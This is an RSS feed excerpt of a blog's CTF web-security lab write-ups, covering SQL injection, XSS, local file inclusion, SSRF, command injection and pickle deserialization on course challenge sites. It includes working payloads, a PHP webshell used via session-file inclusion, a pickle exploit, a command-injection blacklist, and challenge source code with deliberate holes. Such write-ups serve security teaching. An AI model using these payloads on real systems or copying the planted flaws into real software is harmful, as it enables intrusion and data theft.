from flask import Flask, request, render_template, render_template_string, send_file from flask_sqlalchemy import SQLAlchemy db = SQLAlchemy() app = Flask(__name__) app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///app.db" db.init_app(app) with app.app_context(): db.session.execute(""" CREATE TABLE IF NOT EXISTS users( id Integer PRIMARY KEY, username String NOT NULL UNIQUE, password String, count Integer DEFAULT 0 ); """) db.session.execute("INSERT OR REPLACE INTO users (username, password) VALUES ('admin', 'FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}')") db.session.commit() def login(greet): if not greet: return send_file('app.py', mimetype='text/plain') else: return render_template_string(f"Hello {greet}") @app.route('/', methods=["GET", "POST"]) def index(): if request.method == "GET": return render_template('index.html') else: username = request.form.get('username', '') password = request.form.get('password', '') error = '' user = db.session.execute("SELECT username, password FROM users where username=:username", {"username":username}).first() if user and user[1] == password: return login(request.form.get('greet', '')) elif not user: error += "User doesn't exist! " # New feature! count login failed event db.session.execute("UPDATE users SET count = count + 1 WHERE username=:username", {"username": username}) db.session.commit() count = db.session.execute(f"SELECT * FROM users WHERE username='{username}'").first() or [0, 0, 0, 0] error += f'Login faild count: {count[3]}' return render_template('index.html', error=error) if __name__ == "__main__": app.run(host="0.0.0.0") :::</description></item><item><title>Simple Web - 0x08(Lab - `Particles.js`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/index.html</guid><description>Simple Web - 0x08(Lab - Particles.js) tags: CTF Web eductf Challenge: https://particles.ctf.zoolab.org
Description The website can change the theme of layout. The main goal is to leak admin’s cookie.
Source Code Analysis Exploit - XSS Use burp suit to check if the website has XSS vulnerability. Try to modify config parameter Payload 1: 1;alert(123);console.log({x://\ :::spoiler Response 1
... &lt;script> url.value = location; config.value = '1; alert(123); console.log({x://\'; fetch('/1;alert(123);console.log({x://\.json').then(r => r.json()).then(json => { particlesJS("particles-js", json) }) &lt;/script> ... ::: or Payload 2: &lt;/script>&lt;script>alert(123);&lt;/script> :::spoiler Response 2</description></item><item><title>Simple Web - 0x09(Lab - Simple Note)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/index.html</guid><description>Simple Web - 0x09(Lab - Simple Note) tags: CTF Web eductf Challenge: https://note.ctf.zoolab.org/
Background Source Code ... &lt;script> const id = location.pathname.split('/').pop(); fetch(`/api/note/${id}`).then(r => r.json()).then(({ title, content })=>{ url.value = location; titleNode.innerHTML = title; contentNode.innerText = content; }); &lt;/script> ... For instance, if our $id=47a8aad1b3b82dcd4decd36d, the script code will fetch this data as json file and parse title and content. Then it’ll change titleNode by innerHTML and change contentNode by innerText.</description></item><item><title>Simple Web 0x01(Lab - `gitleak`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/index.html</guid><description>Simple Web 0x01(Lab - gitleak) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9000/
Exploit - gitleak + basic Git command Use the extension of Firefox(or Google), Dotgit, to check if the website actually has git leak problem denny0223/scrabble To use scrabble tool to leak information
$ git clone https://github.com/denny0223/scrabble.git $ cd scrabble $ sudo ./scrabble http://h4ck3r.quest:9000/ Still no flag There’s flag.php but still no flag in there. HEAD said HEAD is now at a0228bd Remove flag. Thus, we can look up the history by the command below.</description></item><item><title>Simple Web 0x01(Lab - Hello from Windows 98)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/index.html</guid><description>Simple Web 0x01(Lab - Hello from Windows 98) tags: CTF Web eductf Challenge: https://windows.ctf.zoolab.org/
Very similar to 0x07(Lab - HakkaMD)
Source code :::spoiler code
&lt;?php session_start(); if(isset($_GET['source'])){ highlight_file('./'.$_GET['source'].'.php'); die(); } if(isset($_GET['name']) &amp;&amp; $_GET['name']!=''){ $_SESSION['name'] = $_GET['name']; header("Location: /?page=hi.php"); die(); } if(!isset($_GET['page'])){ header("Location: /?page=say.php"); die(); } ?> &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;title>Hello from Windows 98&lt;/title> &lt;meta charset="UTF-8" /> &lt;link rel="stylesheet" href="https://unpkg.com/98.css" /> &lt;/head> &lt;style> body{ background: url('blue.png'); background-size: cover; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; } &lt;/style> &lt;/style> &lt;body> &lt;div class="window" style="margin: 32px; width: 500px"> &lt;div class="title-bar"> &lt;div class="title-bar-text"> Hello World.. &lt;/div> &lt;div class="title-bar-controls"> &lt;button aria-label="Minimize">&lt;/button> &lt;button aria-label="Maximize">&lt;/button> &lt;button aria-label="Close">&lt;/button> &lt;/div> &lt;/div> &lt;div class="window-body"> &lt;?php include($_GET['page']);?> &lt;/div> &lt;/div> &lt;/body> &lt;/html> :::</description></item><item><title>Simple Web 0x02(Lab - `.DS_Store`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/index.html</guid><description>Simple Web 0x02(Lab - .DS_Store) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9001/
Exploit - .DS_Store Clone lijiejie/ds_store_exp
$ git clone https://github.com/lijiejie/ds_store_exp.git $ python ds_store_exp.py http://h4ck3r.quest:9001/.DS_Store [200] http://h4ck3r.quest:9001/.DS_Store [200] http://h4ck3r.quest:9001/super_secret_meowmeow.php [200] http://h4ck3r.quest:9001/index.php $ cd h4ck3r.quest_9001 $ cat super_secret_meowmeow.php FLAG{.DS_Store is so annoying lmao} Note that, must install python 2, requests, ds_store and modify queue(import queue→import Queue as queue) $ conda create --name py2.7 python=2.7 $ conda install -c auto ds_store $ conda install -c anaconda requests Reference python-no-module-named-queue</description></item><item><title>Simple Web 0x03(Lab - Log me in + Revenge)</title><link>https://bernie6401.github.io/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/index.html</guid><description>Simple Web 0x03(Lab - Log me in + Revenge) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8200/ Challenge: http://h4ck3r.quest:8201/
Exploit - SQLi Payload → ') or ('1'='1') -- # SELECT * FROM admin WHERE (username=’’) or (‘1’=‘1’) – #’) AND (password=‘MTIz’) Flag: FLAG{b4by_sql_inj3cti0n}
Revenge source code :::spoiler code
from flask import Flask, render_template, redirect, request, g, Response import sqlite3 app = Flask(__name__) def get_db(): db = getattr(g, '_database', None) if db is None: db = g._database = sqlite3.connect('/tmp/database.db') db.row_factory = sqlite3.Row return db @app.before_first_request def init_db(): cursor = get_db().cursor() cursor.execute(""" CREATE TABLE IF NOT EXISTS "admin" ( "username" TEXT NOT NULL, "password" TEXT NOT NULL ) """) cursor.execute("SELECT COUNT(*) as count FROM admin WHERE username='admin'") count = cursor.fetchone()['count'] if count == 0: import secrets cursor.execute("INSERT INTO admin (username, password) VALUES (?,?)", ('admin', secrets.token_urlsafe())) get_db().commit() @app.teardown_appcontext def close_connection(exception): db = getattr(g, '_database', None) if db is not None: db.close() @app.route("/") def home(): return render_template("index.html", failed=request.args.get('failed') != None) @app.route("/login", methods=['POST']) def login(): username = request.form.get('username') password = request.form.get('password') if not username or not password: return redirect("/?failed") cur = get_db().execute(f"SELECT * FROM admin WHERE (username='{username}')") res = cur.fetchone() cur.close() if res['username'] == 'admin' and res['password'] == password: return "FLAG: FLAG{&lt;REDACTED>}" return redirect("/?failed") @app.route("/source") def source(): import re source_code = open(__file__).read() source_code = re.sub(r'FLAG{[^}\s]+}', 'FLAG{&lt;REDACTED>}', source_code, 1) return Response(source_code, mimetype='text/plain') if __name__ == '__main__': app.run(debug=True) :::</description></item><item><title>Simple Web 0x04(Lab - Image Space 0x01)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/index.html</guid><description>Simple Web 0x04(Lab - Image Space 0x01) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9010
Source code :::spoiler code
&lt;?php if (isset($_GET['source'])) { highlight_file(__FILE__); exit; } ?> &lt;h1>Image Uploader&lt;/h1> &lt;p>Only supports: jpg, jpeg, png&lt;/p> &lt;!-- upload form --> &lt;form action="index.php" method="POST" enctype="multipart/form-data"> &lt;input type="file" name="image_file"> &lt;input type="submit" value="Upload"> &lt;/form> &lt;p> &lt;a href="https://bernie6401.github.io/?source">View Source&lt;/a> &lt;/p> &lt;?php if (!isset($_FILES['image_file'])) { die('Give me a file!'); } $filename = basename($_FILES['image_file']['name']); $prefix = bin2hex(random_bytes(8)); move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}"); echo "&lt;img src=\"images/${prefix}_${filename}\">"; ?> :::</description></item><item><title>Simple Web 0x05(Lab - Image Space 0x02)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/index.html</guid><description>Simple Web 0x05(Lab - Image Space 0x02) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9011
Source code :::spoiler
&lt;?php if (isset($_GET['source'])) { highlight_file(__FILE__); exit; } ?> &lt;h1>Image Uploader&lt;/h1> &lt;p>Only supports: jpg, jpeg, png&lt;/p> &lt;form action="index.php" method="POST" enctype="multipart/form-data"> &lt;input type="file" name="image_file"> &lt;input type="submit" value="Upload"> &lt;/form> &lt;p> &lt;a href="https://bernie6401.github.io/?source">View Source&lt;/a> &lt;/p> &lt;?php if (!isset($_FILES['image_file'])) { die('Give me a file!'); } $filename = basename($_FILES['image_file']['name']); $extension = strtolower(explode(".", $filename)[1]); if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false) { die("Invalid file extension: $extension."); } $prefix = bin2hex(random_bytes(8)); move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}"); echo "&lt;img src=\"/images/${prefix}_${filename}\">"; ?> :::</description></item><item><title>Simple Web 0x06(Lab - Image Space 0x03)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/index.html</guid><description>Simple Web 0x06(Lab - Image Space 0x03) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9012
Background file signature
Source code :::spoiler
&lt;?php if (isset($_GET['source'])) { highlight_file(__FILE__); exit; } ?> &lt;h1>Image Uploader&lt;/h1> &lt;p>Only supports: jpg, jpeg, png&lt;/p> &lt;form action="index.php" method="POST" enctype="multipart/form-data"> &lt;input type="file" name="image_file"> &lt;input type="submit" value="Upload"> &lt;/form> &lt;p> &lt;a href="https://bernie6401.github.io/?source">View Source&lt;/a> &lt;/p> &lt;?php if (!isset($_FILES['image_file'])) { die('Give me a file!'); } $filename = basename($_FILES['image_file']['name']); $extension = strtolower(explode(".", $filename)[1]); if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false) { die("Invalid file extension: $extension."); } if (in_array($_FILES['image_file']['type'], ["image/png", "image/jpeg", "image/jpg"]) === false) { die("Invalid file type: " . $_SERVER["CONTENT_TYPE"]); } list($_, $_, $type) = getimagesize($_FILES['image_file']['tmp_name']); if ($type !== IMAGETYPE_JPEG &amp;&amp; $type !== IMAGETYPE_PNG) { die("Invalid image type."); } $prefix = bin2hex(random_bytes(8)); move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}"); echo "&lt;img src=\"/images/${prefix}_${filename}\">"; ?> ::: It has 2 extra constraint must be bypassed. Use burpsuite and change valid file signature</description></item><item><title>Simple Web 0x07(Lab - `HakkaMD`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/index.html</guid><description>Simple Web 0x07(Lab - HakkaMD) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8401
Background 資安這條路-Local File Inclusion
Exploit - LFI to RCE First things first, the website has LFI problem http://h4ck3r.quest:8401/?module=/etc/passwd 通靈 It provided phpinfo() so that we can check the save address of session. The setting is default, thus we can use LFI to read session file: http://h4ck3r.quest:8401/?module=/tmp/sess_0qvmvnk5lh140239e6ol9l16h1 We can see that session file store the data of what we enter. Therefore, we could enter webshell to get shell webshell &lt;?php system($_GET['sh']); ?> ↓ http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;sh=ls%20/ ↓ ↓ http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;sh=cat%20/flag_aff6136bbef82137 Then we got flag!!!</description></item><item><title>Simple Web 0x08(Lab - My First Meow Website)</title><link>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/index.html</guid><description>Simple Web 0x08(Lab - My First Meow Website) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8400/ Target: Login as Admin
Background PHP 偽協議 (一) Web Security 0x1
Exploit Observe According to the URL, http://h4ck3r.quest:8400/?page=inc/home, it might have LFI problem. Use php://filter to read page http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=inc/home :::spoiler page source code &lt;!DOCTYPE html> &lt;html lang="en"> &lt;head> &lt;meta charset="UTF-8"> &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"> &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"> &lt;title>Meow&lt;/title> &lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.2/css/bulma.min.css"> &lt;/head> &lt;body> &lt;nav class="navbar is-dark" role="navigation" aria-label="main navigation"> &lt;div class="navbar-brand"> &lt;a class="navbar-item" href="https://bernie6401.github.io/?page=inc/home">🐱&lt;/a> &lt;/div> &lt;div id="navbarBasicExample" class="navbar-menu"> &lt;div class="navbar-start"> &lt;a class="navbar-item" href="https://bernie6401.github.io/?page=inc/home"> Home &lt;/a> &lt;a class="navbar-item" href="https://bernie6401.github.io/?page=inc/about"> About &lt;/a> &lt;a class="navbar-item" href="https://bernie6401.github.io/admin.php"> Admin &lt;/a> &lt;/div> &lt;/div> &lt;/nav> &lt;div class="container" style="margin-top: 1em;"> &lt;?php if (isset($_GET['page'])) include($_GET['page'] . ".php"); else include("inc/home.php"); ?> &lt;/div> &lt;/body> &lt;/html> ::: Observe page source code We know that admin.php is under / directory. http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin :::spoiler admin source code &lt;h1>Admin Panel&lt;/h1> &lt;form> &lt;input type="text" name="username" value="admin"> &lt;input type="password" name="password"> &lt;input type="submit" value="Submit"> &lt;/form> &lt;?php $admin_account = array("username" => "admin", "password" => "kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ"); if ( isset($_GET['username']) &amp;&amp; isset($_GET['password']) &amp;&amp; $_GET['username'] === $admin_account['username'] &amp;&amp; $_GET['password'] === $admin_account['password'] ) { echo "&lt;h1>LOGIN SUCCESS!&lt;/h1>&lt;p>".getenv('FLAG')."&lt;/p>"; } ?> ::: Then we get admin password is: kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ. Then we got flag!!!</description></item><item><title>Simple Web 0x09(Lab - DNS Lookup Tool)</title><link>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/index.html</guid><description>Simple Web 0x09(Lab - DNS Lookup Tool) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8300/
Source code :::spoiler code
&lt;?php isset($_GET['source']) and die(show_source(__FILE__, true)); ?> &lt;!DOCTYPE html> &lt;html lang="en"> &lt;head> &lt;meta charset="UTF-8"> &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"> &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"> &lt;title>DNS Lookup Tool | Baby&lt;/title> &lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css"> &lt;/head> &lt;body> &lt;section class="section"> &lt;div class="container"> &lt;div class="column is-6 is-offset-3 has-text-centered"> &lt;div class="box"> &lt;h1 class="title">DNS Lookup Tool 🔍&lt;/h1> &lt;form method="POST"> &lt;div class="field"> &lt;div class="control"> &lt;input class="input" type="text" name="name" placeholder="example.com" id="hostname" value="&lt;?= $_POST['name'] ?? '' ?>"> &lt;/div> &lt;/div> &lt;button class="button is-block is-info is-fullwidth"> Lookup! &lt;/button> &lt;/form> &lt;br> &lt;?php if (isset($_POST['name'])) : ?> &lt;section class="has-text-left"> &lt;p>Lookup result:&lt;/p> &lt;pre>&lt;?= shell_exec("host '" . $_POST['name'] . "';") ?>&lt;/pre> &lt;/section> &lt;?php endif; ?> &lt;hr> &lt;a id="magic">Magic&lt;/a> | &lt;a href="https://bernie6401.github.io/?source">Source Code&lt;/a> &lt;/div> &lt;article class="message is-link is-hidden is-size-4" id="hint"> &lt;div class="message-body is-family-monospace"> host '&lt;span class="has-text-danger" id="command">&lt;/span>'; &lt;/div> &lt;/article> &lt;/div> &lt;/div> &lt;/section> &lt;script> magic.onclick = () => hint.classList.toggle("is-hidden"); window.onload = hostname.oninput = () => command.textContent = hostname.value; &lt;/script> &lt;/body> &lt;/html> :::</description></item><item><title>Simple Web 0x10(Lab - DNS Lookup Tool | WAF)</title><link>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/index.html</guid><description>Simple Web 0x10(Lab - DNS Lookup Tool | WAF) tags: NTUSTWS CTF Web Background 2022/03/30 網頁安全 Command injection
Source code :::spoiler code
&lt;?php isset($_GET['source']) and die(show_source(__FILE__, true)); ?> &lt;!DOCTYPE html> &lt;html lang="en"> &lt;head> &lt;meta charset="UTF-8"> &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"> &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"> &lt;title>DNS Lookup Tool | WAF&lt;/title> &lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css"> &lt;/head> &lt;body> &lt;section class="section"> &lt;div class="container"> &lt;div class="column is-6 is-offset-3 has-text-centered"> &lt;div class="box"> &lt;h1 class="title">DNS Lookup Tool 🔍 | WAF Edition&lt;/h1> &lt;form method="POST"> &lt;div class="field"> &lt;div class="control"> &lt;input class="input" type="text" name="name" placeholder="example.com" id="hostname" value="&lt;?= $_POST['name'] ?? '' ?>"> &lt;/div> &lt;/div> &lt;button class="button is-block is-info is-fullwidth"> Lookup! &lt;/button> &lt;/form> &lt;br> &lt;?php if (isset($_POST['name'])) : ?> &lt;section class="has-text-left"> &lt;p>Lookup result:&lt;/p> &lt;pre> &lt;?php $blacklist = ['|', '&amp;', ';', '>', '&lt;', "\n", 'flag']; $is_input_safe = true; foreach ($blacklist as $bad_word) if (strstr($_POST['name'], $bad_word) !== false) $is_input_safe = false; if ($is_input_safe) system("host '" . $_POST['name'] . "';"); else echo "HACKER!!!"; ?> &lt;/pre> &lt;/section> &lt;?php endif; ?> &lt;hr> &lt;a href="https://bernie6401.github.io/?source">Source Code&lt;/a> &lt;/div> &lt;/div> &lt;/div> &lt;/section> &lt;/body> &lt;/html> ::: It set some protection such as blacklist.</description></item><item><title>Simple Web 0x11(Lab - XSS Me)</title><link>https://bernie6401.github.io/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/index.html</guid><description>Simple Web 0x11(Lab - XSS Me) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8800/
Background :::spoiler 攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客(這是其中一種受害方式，也可能很直接的被盜取COOKIE之類的) :::
Source code ... &lt;script> const message = {"icon": "error", "titleText": "User not found.", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true}; window.onload = function () { if (message !== null) Swal.fire(message); } &lt;/script> ... Exploit Check XSS ... &lt;script> const message = {"icon": "error", "titleText": "youshallnotpass", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true}; window.onload = function () { if (message !== null) Swal.fire(message); } &lt;/script> ... Try to inject script tag Payload: http://h4ck3r.quest:8800/?type=error&amp;message=%3C/script%3E%3Cscript%3Ealert(123)%3C/script%3E// ... &lt;script> const message = {"icon": "error", "titleText": "&lt;/script>&lt;script>alert(123)&lt;/script>//", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true}; window.onload = function () { if (message !== null) Swal.fire(message); } &lt;/script> Hint If you login as guest(password = guest), then you can get the response Fetch flag and send to beeceptor Payload:</description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/index.html</guid><description>Simple Web 0x12(Lab - Web Preview Card) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8500/
Background Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」
Exploit - SSRF When you see a preview function, then it may have SSRF problem.
Test it file:///etc/passwd or http://127.0.0.1 Analyze flag.php :::spoiler source code
&lt;?php if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') die("Only for localhost user."); ?> &lt;form action="https://bernie6401.github.io/flag.php" method="post"> Do you want the FLAG? &lt;input type="text" name="givemeflag" value="no"> &lt;input type="submit"> &lt;/form> &lt;?php if (isset($_POST['givemeflag']) &amp;&amp; $_POST['givemeflag'] === 'yes') echo "FLAG:", getenv('FLAG'); ::: If you want flag, you need visit /flag.php as localhost and send a form data with parameter givemeflag.</description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/index.html</guid><description>Simple Web 0x12(Lab - Web Preview Card) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8500/
Background Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」
Exploit - SSRF When you see a preview function, then it may have SSRF problem.
Test it file:///etc/passwd or http://127.0.0.1 Analyze flag.php :::spoiler source code
&lt;?php if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') die("Only for localhost user."); ?> &lt;form action="https://bernie6401.github.io/flag.php" method="post"> Do you want the FLAG? &lt;input type="text" name="givemeflag" value="no"> &lt;input type="submit"> &lt;/form> &lt;?php if (isset($_POST['givemeflag']) &amp;&amp; $_POST['givemeflag'] === 'yes') echo "FLAG:", getenv('FLAG'); ::: If you want flag, you need visit /flag.php as localhost and send a form data with parameter givemeflag.</description></item><item><title>Simple Web 0x13(Lab - SSRFrog)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/index.html</guid><description>Simple Web 0x13(Lab - SSRFrog) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8501/
Background javascript Set() Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」
Source code :::spoiler source code
const express = require("express"); const http = require("http"); const app = express(); app.get("/source", (req, res) => { return res.sendFile(__filename); }) app.get('/', (req, res) => { const { url } = req.query; if (!url || typeof url !== 'string') return res.sendFile(__dirname + "/index.html"); // no duplicate characters in `url` if (url.length !== new Set(url).size) return res.sendFile(__dirname + "/frog.png"); try { http.get(url, resp => { resp.setEncoding("utf-8"); resp.statusCode === 200 ? resp.on('data', data => res.send(data)) : res.send(":("); }).on('error', () => res.send("WTF?")); } catch (error) { res.send("WTF?"); } }); app.listen(3000, '0.0.0.0'); :::</description></item><item><title>Simple Web 0x14(Lab - Debug)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/index.html</guid><description>Simple Web 0x14(Lab - Debug) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9020/
Background Source code :::spoiler source code
from flask import Flask, request, Response import urllib.request import json app = Flask(__name__) app.config['FLAG'] = "FL4G{fake_flag}" @app.route('/') def index(): return ''' &lt;form action="https://bernie6401.github.io/proxy"> &lt;input type="text" name="url" placeholder="URL"> &lt;input type="submit"> &lt;/form> &lt;p>&lt;a href="https://bernie6401.github.io/source">Source Code&lt;/a> | &lt;a href="https://bernie6401.github.io/debug">Debug&lt;/a>&lt;/p> ''' @app.route("/proxy") def proxy(): url = request.args.get("url") if url is None: return "No URL provided" if "https://" not in url: url = "https://" + url try: with urllib.request.urlopen(url) as response: return response.read() except urllib.error.HTTPError as e: return str(e) @app.route("/debug") def debug(): # only allow access for localhost if request.remote_addr != "127.0.0.1": return "Access denied", 403 return json.dumps(app.config, default=lambda _: None) @app.route("/source") def source(): import re source_code = open(__file__).read() source_code = re.sub(r'FLAG{.*}', r'FL4G{fake_flag}', source_code, count=1) return Response(source_code, mimetype='text/plain') :::</description></item><item><title>Simple Web 0x15.5(Pickle)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/index.html</guid><description>Simple Web 0x15.5(Pickle) tags: NTUSTWS CTF Web Background - Pickle Python magic method: __reduce__ __recude__ is used to define what needs to be done when deserializing. Web Hacking | 終章【EDU-CTF 2021】
Source code :::spoiler exploit.py
import pickle import os import pickletools class exploit(object): def __reduce__(self): return (os.system, ('pwd',)) serialized = pickle.dumps(exploit()) print(bytes.hex(serialized)) optim_s = pickletools.optimize(serialized) print(pickletools.dis(serialized)) print(pickletools.dis(optim_s)) :::
:::spoiler server_app.py
import pickle serialized = bytes.fromhex(input('Data: ')) pickle.loads(serialized) :::
Output &amp; Analyze In Linux</description></item><item><title>Simple Web 0x15(Lab - `Jinja`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/index.html</guid><description>Simple Web 0x15(Lab - Jinja) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8700/
Background Web Security 0x1
Source code :::spoiler code
